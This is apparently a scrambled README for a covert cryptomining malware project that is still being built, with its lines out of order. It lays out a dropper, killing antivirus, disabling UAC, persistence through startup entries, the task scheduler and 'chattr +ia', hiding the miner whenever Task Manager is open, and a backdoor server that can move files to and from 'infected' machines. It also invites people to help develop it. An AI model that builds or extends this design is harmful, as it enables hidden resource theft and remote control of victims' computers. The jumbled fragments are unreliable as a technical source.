
        system("sudo chattr +ia file");
     Check_task_manager();
    if(root){
    sudo apt-get install libcurl4-openssl-dev# SOURCE CODE OF CRYPTOMINING
    }
# C++ curl
# Client side
# Contributing
# CryptoMining  (WORK IN PROGRESS)
# Dropper
# Ideias
# Server
# Server side
## Persistence
* Cryptography to secure client-server communication 
* Multiple Miners 
* Process hiding and obfuscation / Persistence 
* create hidden/secure directory to store settings and info about the mining process
* less third-parties libraries possible 
**cgminer** pool name 
**file persistence and undeleted files**
- Adding executable in startup
- Adding executable in task scheduler
- Compression (dropper/executable)
- Download the dropper -> URL to download the dropper binary
- Download the executable -> dropper will hit this endpoint to download the executable binary -> specific for each OS (linux, windows, macOs ...)
- Kill av
- Run as admin
- Self-destruct - the dropper will kill itself after finishing its work
- disable UAC
- executable IsAlive -> executable hits this endpoint so the server knows who's active mining - hit every X mins
- executable connect -> when executable start running hit this endpoint first - send info about the infected machine and get pool info and so on ...
Also will be capable of sending files and downloading files from the infected machine. 
Connection between miner and serverDownload the executable as  ```.exe``` and run in the machine
Dropper is the program that first executes in an infection.
Every new miner will have an directory, containing info about the mining time, logs, Keys used to secure communication(cryptography), etc.
Feel free to join the development of this cryptominer with code or ideas.
Hardcoded encrypted :server, port and mining pool info 
Help is welcome!
I've created a trello to keep the progress, what have been done, and what else is there to do. 
If the task manager is opened, the child process is killed. When closed, child will be respawned.
Infected victim should not know or find about the cryptominer
Malware + cgminer 
Multithreaded c++ server from scratch, will accept new miners. get info from miners, and will have direct access to the victim machine from a backdoor.
One process is responsible for server communication and checking task manager, while the child process will only mine.
Premisses:
The server has to aknowledge new miners.  
This program isn't ready, I'm developing it everyday. 
This web server will handle all the HTTP traffic.
```
``` c++
```c++
check if task manager is open 
continue_mining(); 
global bool lock_taskmanager = false; 
here's the source code of the malware# PYTHON WEB SERVER
https://trello.com/b/EYUmIGy3/cryptominer
while(!lock_taskmanager){
}
